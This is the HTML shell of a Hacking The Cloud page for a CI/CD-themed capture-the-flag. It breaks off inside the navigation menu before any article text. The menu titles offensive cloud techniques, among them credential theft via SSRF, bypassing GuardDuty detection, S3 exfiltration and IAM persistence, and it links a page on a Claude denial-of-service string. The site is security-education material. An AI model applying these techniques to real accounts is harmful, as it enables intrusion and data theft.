<!DOCTYPE html><html lang="en" class="no-js"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><meta name="description" content="An AWS/GitLab CICD themed CTF."><link href="https://hackingthe.cloud/aws/capture_the_flag/cicdont/" rel="canonical"><link href="../../deprecated/whoami/" rel="prev"><link href="../../../azure/abusing-managed-identities/" rel="next"><link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../feed_rss_created.xml"><link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../feed_rss_updated.xml"><link rel="icon" href="../../../assets/favicon.png"><meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.0+insiders-4.53.18"><title>CI/CDon't - Hacking The Cloud</title><link rel="stylesheet" href="../../../assets/stylesheets/main.df281a37.min.css"><link rel="stylesheet" href="../../../assets/stylesheets/palette.ab4e12ef.min.css"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&amp;display=fallback"><style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style><link rel="stylesheet" href="../../../stylesheets/extra.css"><script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script><meta property="og:type" content="website"><meta property="og:title" content="CI/CDon't - Hacking The Cloud"><meta property="og:description" content="An AWS/GitLab CICD themed CTF."><meta property="og:image" content="https://hackingthe.cloud/assets/images/social/aws/capture_the_flag/cicdont.png"><meta property="og:image:type" content="image/png"><meta property="og:image:width" content="1200"><meta property="og:image:height" content="630"><meta content="https://hackingthe.cloud/aws/capture_the_flag/cicdont/" property="og:url"><meta property="twitter:card" content="summary_large_image"><meta property="twitter:title" content="CI/CDon't - Hacking The Cloud"><meta property="twitter:description" content="An AWS/GitLab CICD themed CTF."><meta property="twitter:image" content="https://hackingthe.cloud/assets/images/social/aws/capture_the_flag/cicdont.png"><link href="../../../assets/stylesheets/glightbox.min.css" rel="stylesheet"><script src="../../../assets/javascripts/glightbox.min.js"></script><style id="glightbox-style">
            html.glightbox-open { overflow: initial; height: 100%; }
            .gslide-title { margin-top: 0px; user-select: text; }
            .gslide-desc { color: #666; user-select: text; }
            .gslide-image img { background: white; }
            .gscrollbar-fixer { padding-right: 15px; }
            .gdesc-inner { font-size: 0.75rem; }
            body[data-md-color-scheme="slate"] .gdesc-inner { background: var(--md-default-bg-color); }
            body[data-md-color-scheme="slate"] .gslide-title { color: var(--md-default-fg-color); }
            body[data-md-color-scheme="slate"] .gslide-desc { color: var(--md-default-fg-color); }
        </style></head> <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="indigo"> <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off"> <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off"> <label class="md-overlay" for="__drawer"></label> <div data-md-component="skip"> <a href="#background" class="md-skip"> Skip to content </a> </div> <div data-md-component="announce"> <aside class="md-banner"> <div class="md-banner__inner md-grid md-typeset"> The CFP for <a rel="me" href="https://fwdcloudsec.org/conference/north-america/cfp.html"> <strong>fwd:cloudsec NA 2026</strong> </a> is open now! This is your opportunity to speak at the best cloud security conference on earth! </div> </aside> </div> <header class="md-header" data-md-component="header"> <nav class="md-header__inner md-grid" aria-label="Header"> <a href="../../.." title="Hacking The Cloud" class="md-header__button md-logo" aria-label="Hacking The Cloud" data-md-component="logo"> <img src="../../../assets/logo.png" alt="logo"> </a> <label class="md-header__button md-icon" for="__drawer"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"></path></svg> </label> <div class="md-header__title" data-md-component="header-title"> <div class="md-header__ellipsis"> <div class="md-header__topic"> <span class="md-ellipsis"> Hacking The Cloud </span> </div> <div class="md-header__topic" data-md-component="header-topic"> <span class="md-ellipsis"> CI/CDon't </span> </div> </div> </div> <form class="md-header__option" data-md-component="palette"> <input class="md-option" data-md-color-media data-md-color-scheme="slate" data-md-color-primary="red" data-md-color-accent="indigo" aria-label="Switch to Dark Mode" type="radio" name="__palette" id="__palette_0"> <label class="md-header__button md-icon" title="Switch to Dark Mode" for="__palette_1" hidden> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 6H7c-3.31 0-6 2.69-6 6s2.69 6 6 6h10c3.31 0 6-2.69 6-6s-2.69-6-6-6m0 10H7c-2.21 0-4-1.79-4-4s1.79-4 4-4h10c2.21 0 4 1.79 4 4s-1.79 4-4 4M7 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3"></path></svg> </label> <input class="md-option" data-md-color-media data-md-color-scheme="default" data-md-color-primary="red" data-md-color-accent="indigo" aria-label="Switch to Light Mode" type="radio" name="__palette" id="__palette_1"> <label class="md-header__button md-icon" title="Switch to Light Mode" for="__palette_0" hidden> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M17 7H7a5 5 0 0 0-5 5 5 5 0 0 0 5 5h10a5 5 0 0 0 5-5 5 5 0 0 0-5-5m0 8a3 3 0 0 1-3-3 3 3 0 0 1 3-3 3 3 0 0 1 3 3 3 3 0 0 1-3 3"></path></svg> </label> </form> <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script> <label class="md-header__button md-icon" for="__search"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> </label> <div class="md-search" data-md-component="search" role="dialog"> <label class="md-search__overlay" for="__search"></label> <div class="md-search__inner" role="search"> <form class="md-search__form" name="search"> <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required> <label class="md-search__icon md-icon" for="__search"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"></path></svg> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"></path></svg> </label> <nav class="md-search__options" aria-label="Search"> <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"></path></svg> </button> </nav> </form> <div class="md-search__output"> <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix> <div class="md-search-result" data-md-component="search-result"> <div class="md-search-result__meta"> Initializing search </div> <ol class="md-search-result__list" role="presentation"></ol> </div> </div> </div> </div> </div> <div class="md-header__source"> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud" title="Go to repository" class="md-source" data-md-component="source"> <div class="md-source__icon md-icon"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </div> <div class="md-source__repository"> Hacking The Cloud </div> </a> </div> </nav> </header> <div class="md-container" data-md-component="container"> <nav class="md-tabs" aria-label="Tabs" data-md-component="tabs"> <div class="md-grid"> <ul class="md-tabs__list"> <li class="md-tabs__item"> <a href="../../.." class="md-tabs__link"> Hacking The Cloud </a> </li> <li class="md-tabs__item md-tabs__item--active"> <a href="../../general-knowledge/aws_cli_tips_and_tricks/" class="md-tabs__link"> AWS </a> </li> <li class="md-tabs__item"> <a href="../../../azure/abusing-managed-identities/" class="md-tabs__link"> Azure </a> </li> <li class="md-tabs__item"> <a href="../../../gcp/general-knowledge/default-account-names/" class="md-tabs__link"> GCP </a> </li> <li class="md-tabs__item"> <a href="../../../ai-llm/exploitation/claude_magic_string_denial_of_service/" class="md-tabs__link"> AI and LLM </a> </li> <li class="md-tabs__item"> <a href="../../../terraform/terraform_ansi_escape_evasion/" class="md-tabs__link"> Terraform </a> </li> <li class="md-tabs__item"> <a href="../../../blog/call_for_ai_research/" class="md-tabs__link"> Blog </a> </li> </ul> </div> </nav> <main class="md-main" data-md-component="main"> <div class="md-main__inner md-grid"> <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation"> <div class="md-sidebar__scrollwrap"> <div class="md-sidebar__inner"> <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0"> <label class="md-nav__title" for="__drawer"> <a href="../../.." title="Hacking The Cloud" class="md-nav__button md-logo" aria-label="Hacking The Cloud" data-md-component="logo"> <img src="../../../assets/logo.png" alt="logo"> </a> Hacking The Cloud </label> <div class="md-nav__source"> <a href="https://github.com/Hacking-the-Cloud/hackingthe.cloud" title="Go to repository" class="md-source" data-md-component="source"> <div class="md-source__icon md-icon"> <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!-- Font Awesome Free 7.0.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"></path></svg> </div> <div class="md-source__repository"> Hacking The Cloud </div> </a> </div> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../.." class="md-nav__link"> <span class="md-ellipsis"> Hacking The Cloud </span> </a> </li> <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" checked> <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex> <span class="md-ellipsis"> AWS </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="true"> <label class="md-nav__title" for="__nav_2"> <span class="md-nav__icon md-icon"></span> AWS </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_1"> <label class="md-nav__link" for="__nav_2_1" id="__nav_2_1_label" tabindex="0"> <span class="md-ellipsis"> General Knowledge </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_1_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_1"> <span class="md-nav__icon md-icon"></span> General Knowledge </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../general-knowledge/aws_cli_tips_and_tricks/" class="md-nav__link"> <span class="md-ellipsis"> AWS CLI Tips and Tricks </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/aws_organizations_defaults/" class="md-nav__link"> <span class="md-ellipsis"> AWS Organizations Defaults &amp; Pivoting </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/block-expensive-actions-with-scps/" class="md-nav__link"> <span class="md-ellipsis"> Prevent Expensive AWS API Actions with SCPs </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/connection-tracking/" class="md-nav__link"> <span class="md-ellipsis"> Connection Tracking </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/iam-key-identifiers/" class="md-nav__link"> <span class="md-ellipsis"> IAM unique identifiers </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/intro_metadata_service/" class="md-nav__link"> <span class="md-ellipsis"> Introduction to the Instance Metadata Service </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/introduction_user_data/" class="md-nav__link"> <span class="md-ellipsis"> Introduction to User Data </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/using_stolen_iam_credentials/" class="md-nav__link"> <span class="md-ellipsis"> Using Stolen IAM Credentials </span> </a> </li> <li class="md-nav__item"> <a href="../../general-knowledge/why_recreating_an_iam_role_doesnt_restore_trust_a_gotcha_in_role_arns/" class="md-nav__link"> <span class="md-ellipsis"> Why Recreating an IAM Role Doesn't Restore Trust: A Gotcha in Role ARNs </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_2"> <label class="md-nav__link" for="__nav_2_2" id="__nav_2_2_label" tabindex="0"> <span class="md-ellipsis"> Enumeration </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_2_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_2"> <span class="md-nav__icon md-icon"></span> Enumeration </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../enumeration/account_id_from_ec2/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate AWS Account ID from an EC2 Instance </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/account_id_from_s3_bucket/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate AWS Account ID from a Public S3 Bucket </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/brute_force_iam_permissions/" class="md-nav__link"> <span class="md-ellipsis"> Brute Force IAM Permissions </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/bypass_cognito_user_enumeration_controls/" class="md-nav__link"> <span class="md-ellipsis"> Bypass Cognito Account Enumeration Controls </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/discover_secrets_in_public_aims/" class="md-nav__link"> <span class="md-ellipsis"> Discover secrets in public AMIs </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enum_iam_user_role/" class="md-nav__link"> <span class="md-ellipsis"> Unauthenticated Enumeration of IAM Users and Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_principal_arn_from_unique_id/" class="md-nav__link"> <span class="md-ellipsis"> Derive a Principal ARN from an AWS Unique Identifier </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_root_email_from_console/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate Root User Email Address from the AWS Console </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/enumerate_services_via_aws_backup/" class="md-nav__link"> <span class="md-ellipsis"> Enumerate services via AWS Backup </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/get-account-id-from-keys/" class="md-nav__link"> <span class="md-ellipsis"> Get Account ID from AWS Access Keys </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/loot_public_ebs_snapshots/" class="md-nav__link"> <span class="md-ellipsis"> Loot Public EBS Snapshots </span> </a> </li> <li class="md-nav__item"> <a href="../../enumeration/whoami/" class="md-nav__link"> <span class="md-ellipsis"> Whoami - Get Principal Name From Keys </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3"> <label class="md-nav__link" for="__nav_2_3" id="__nav_2_3_label" tabindex="0"> <span class="md-ellipsis"> Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_3_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_3"> <span class="md-nav__icon md-icon"></span> Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../exploitation/abusing-container-registry/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Elastic Container Registry for Lateral Movement </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/cognito_identity_pool_excessive_privileges/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Overpermissioned AWS Cognito Identity Pools </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/cognito_user_self_signup/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Unintended Self-Signup in AWS Cognito </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/ec2-metadata-ssrf/" class="md-nav__link"> <span class="md-ellipsis"> Steal EC2 Metadata Credentials via SSRF </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/iam_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> AWS IAM Privilege Escalation Techniques </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/lambda-steal-iam-credentials/" class="md-nav__link"> <span class="md-ellipsis"> Steal IAM Credentials and Event Data from Lambda </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/local_ec2_priv_esc_through_user_data/" class="md-nav__link"> <span class="md-ellipsis"> EC2 Privilege Escalation Through User Data </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/orphaned_cloudfront_or_dns_takeover_via_s3/" class="md-nav__link"> <span class="md-ellipsis"> DNS and CloudFront Domain Takeover via Deleted S3 Buckets </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/route53_modification_privilege_escalation/" class="md-nav__link"> <span class="md-ellipsis"> AWS API Call Hijacking via ACM-PCA </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3-bucket-replication-exfiltration/" class="md-nav__link"> <span class="md-ellipsis"> Exfiltrating S3 Data with Bucket Replication Policies </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3_server_access_logs/" class="md-nav__link"> <span class="md-ellipsis"> Data Exfiltration through S3 Server Access Logs </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/s3_streaming_copy/" class="md-nav__link"> <span class="md-ellipsis"> S3 Streaming Copy </span> </a> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_3_13"> <div class="md-nav__link md-nav__container"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/" class="md-nav__link "> <span class="md-ellipsis"> Misconfigured Resource Based Policies </span> </a> <label class="md-nav__link " for="__nav_2_3_13" id="__nav_2_3_13_label" tabindex="0"> <span class="md-nav__icon md-icon"></span> </label> </div> <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_2_3_13_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_3_13"> <span class="md-nav__icon md-icon"></span> Misconfigured Resource Based Policies </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploit_amplify_vulnerability_in_same_account_scenario/" class="md-nav__link"> <span class="md-ellipsis"> CVE-2024-28056: Exploit an AWS Amplify Vulnerability in Same-Account Scenarios </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploiting_misconfigured_gitlab_oidc_aws_iam_roles/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Misconfigured GitLab OIDC AWS IAM Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploting_misconfigured_terraform_cloud_oidc_aws_iam_roles/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Misconfigured Terraform Cloud OIDC AWS IAM Roles </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/exploting_public_resources_attack_playbook/" class="md-nav__link"> <span class="md-ellipsis"> Exploiting Public AWS Resources Programmatically - The Playbook </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/misconfigured_ecr_resource_policy/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Misconfigured ECR Resource Policies </span> </a> </li> <li class="md-nav__item"> <a href="../../exploitation/Misconfigured_Resource-Based_Policies/misconfigured_iam_role_trust_policy_wildcard_principal/" class="md-nav__link"> <span class="md-ellipsis"> Abusing Misconfigured Role Trust Policies with a Wildcard Principal </span> </a> </li> </ul> </nav> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_4"> <label class="md-nav__link" for="__nav_2_4" id="__nav_2_4_label" tabindex="0"> <span class="md-ellipsis"> Avoid Detection </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_4_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_4"> <span class="md-nav__icon md-icon"></span> Avoid Detection </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../avoiding-detection/guardduty-pentest/" class="md-nav__link"> <span class="md-ellipsis"> Bypass GuardDuty Pentest Findings for the AWS CLI </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/guardduty-tor-client/" class="md-nav__link"> <span class="md-ellipsis"> Bypass GuardDuty Tor Client Findings </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/modify-guardduty-config/" class="md-nav__link"> <span class="md-ellipsis"> Modify GuardDuty Configuration </span> </a> </li> <li class="md-nav__item"> <a href="../../avoiding-detection/steal-keys-undetected/" class="md-nav__link"> <span class="md-ellipsis"> Bypass Credential Exfiltration Detection </span> </a> </li> </ul> </nav> </li> <li class="md-nav__item md-nav__item--nested"> <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2_5"> <label class="md-nav__link" for="__nav_2_5" id="__nav_2_5_label" tabindex="0"> <span class="md-ellipsis"> Post Exploitation </span> <span class="md-nav__icon md-icon"></span> </label> <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_2_5_label" aria-expanded="false"> <label class="md-nav__title" for="__nav_2_5"> <span class="md-nav__icon md-icon"></span> Post Exploitation </label> <ul class="md-nav__list" data-md-scrollfix> <li class="md-nav__item"> <a href="../../post_exploitation/codebuild_github_runner_persistence/" class="md-nav__link"> <span class="md-ellipsis"> AWS CodeBuild GitHub Runner Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/create_a_console_session_from_iam_credentials/" class="md-nav__link"> <span class="md-ellipsis"> Create a Console Session from IAM Credentials </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/download_tools_and_exfiltrate_data_with_aws_cli/" class="md-nav__link"> <span class="md-ellipsis"> Download Tools and Exfiltrate Data with the AWS CLI </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/get_iam_creds_from_console_session/" class="md-nav__link"> <span class="md-ellipsis"> Get IAM Credentials from a Console Session </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/iam_persistence/" class="md-nav__link"> <span class="md-ellipsis"> AWS IAM Persistence Methods </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/iam_persistence_eventual_consistency/" class="md-nav__link"> <span class="md-ellipsis"> IAM Persistence through Eventual Consistency </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/iam_rogue_oidc_identity_provider/" class="md-nav__link"> <span class="md-ellipsis"> IAM Rogue OIDC Identity Provider Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/iam_roles_anywhere_persistence/" class="md-nav__link"> <span class="md-ellipsis"> IAM Roles Anywhere Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/intercept_ssm_communications/" class="md-nav__link"> <span class="md-ellipsis"> Intercept SSM Communications </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/lambda_persistence/" class="md-nav__link"> <span class="md-ellipsis"> Lambda Persistence </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/network-firewall-egress-filtering-bypass/" class="md-nav__link"> <span class="md-ellipsis"> AWS Network Firewall Egress Filtering Bypass </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/role-chain-juggling/" class="md-nav__link"> <span class="md-ellipsis"> Role Chain Juggling </span> </a> </li> <li class="md-nav__item"> <a href="../../post_exploitation/run_shell_commands_on_ec2/" class="md-nav__link"> <span class="md-ellipsis"> Run Shell Commands 